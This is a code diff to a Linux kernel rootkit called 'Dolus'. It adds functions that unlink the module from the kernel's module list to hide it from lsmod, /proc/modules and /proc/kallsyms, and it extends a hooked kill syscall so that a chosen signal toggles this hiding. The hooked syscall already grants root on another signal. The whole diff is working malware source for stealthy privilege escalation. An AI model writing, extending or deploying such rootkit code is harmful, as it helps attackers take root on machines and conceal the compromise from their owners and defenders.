@@ -10,6 +10,7 @@ created by: kargisimos
 #include <linux/unistd.h>   //contains syscall numbers e.g. __NR_kill
 #include <asm/paravirt.h>   //contains function for read_cr0(), e.g. read control register 0
 #include <linux/dirent.h>   // contains dirent structs etc
+#include <linux/list.h>     //macros related to linked lists are defined here e.g. list_add(), list_del()
 #include <linux/syscalls.h>
 
 //uncomment next line to enable debugging
@@ -149,7 +150,7 @@ https://www.man7.org/linux/man-pages/man7/signal.7.html
 */
 enum signals {
     SIGSUPER = 33, //become root
-    SIGINVIS = 63, //become invisible
+    SIGINVIS = 34, //hide Dolus from lsmod, /proc/modules, /proc/kallsyms, /sys/module
 };
 
 //https://github.com/torvalds/linux/blob/master/Documentation/security/credentials.rst#altering-credentials
@@ -170,9 +171,32 @@ void set_root(void) {
 }
 
 
+//hide rootkit: 1->hidden, 0->unhidden
+static short hidden = 0;
+static struct list_head *prev_module;
+
+
+//https://github.com/torvalds/linux/blob/master/include/linux/list.h
+void hide_dolus(void) {
+    //for lsmod, /proc/modules, /proc/kallsyms
+    prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+
+    //for /sys/module TODO
+    //kobject_del(&THIS_MODULE->mkobj.kobj);
+}
+
+void unhide_dolus(void) {
+    list_add(&THIS_MODULE->list, prev_module);
+}
+
+
+
 #if PTREGS_SYSCALL_STUB
 static asmlinkage long hack_kill(const struct pt_regs *regs) {
     void set_root(void);
+    void unhide_dolus(void);
+    void hide_dolus(void);
 
     int sig = regs->si;
     if (sig == SIGSUPER) {
@@ -182,10 +206,23 @@ static asmlinkage long hack_kill(const struct pt_regs *regs) {
         DEBUG_INFO("[+]Dolus: root privileges successfully granted\n");
         return 0;
     }
-    else if(sig == SIGINVIS) {
+    else if ((sig == SIGINVIS) && (hidden == 0)) {
         DEBUG_INFO("[+]Dolus: received SIGINVIS kill signal: %d\n", sig);
+        DEBUG_INFO("[+]Dolus: hiding Dolus\n");
+        hide_dolus();
+        hidden = 1;
+        DEBUG_INFO("[+]Dolus: successfully hide Dolus\n");
         return 0;
     }
+    else if ((sig == SIGINVIS) && (hidden == 1)) {
+        DEBUG_INFO("[+]Dolus: received SIGINVIS kill signal: %d\n", sig);
+        DEBUG_INFO("[+]Dolus: unhiding Dolus\n");
+        unhide_dolus();
+        hidden = 0;
+        DEBUG_INFO("[+]Dolus: successfully unhide Dolus\n");
+        return 0;
+    }
+
     //if received kill signal is not SIGSUPER, return original syscall
     return orig_kill(regs);
 }
@@ -201,8 +238,20 @@ static asmlinkage long hack_kill(pid_t pid, int sig) {
         DEBUG_INFO("[+]Dolus: root privileges successfully granted\n");
         return 0;
     }
-    else if(sig == SIGINVIS) {
+    else if ((sig == SIGINVIS) && (hidden == 0)) {
         DEBUG_INFO("[+]Dolus: received SIGINVIS kill signal: %d\n", sig);
+        DEBUG_INFO("[+]Dolus: hiding Dolus\n");
+        hide_dolus();
+        hidden = 1;
+        DEBUG_INFO("[+]Dolus: successfully hide Dolus\n");
+        return 0;
+    }
+    else if ((sig == SIGINVIS) && (hidden == 1)) {
+        DEBUG_INFO("[+]Dolus: received SIGINVIS kill signal: %d\n", sig);
+        DEBUG_INFO("[+]Dolus: unhiding Dolus\n");
+        unhide_dolus();
+        hidden = 0;
+        DEBUG_INFO("[+]Dolus: successfully unhide Dolus\n");
         return 0;
     }
     //if received kill signal is not SIGSUPER, return original syscall
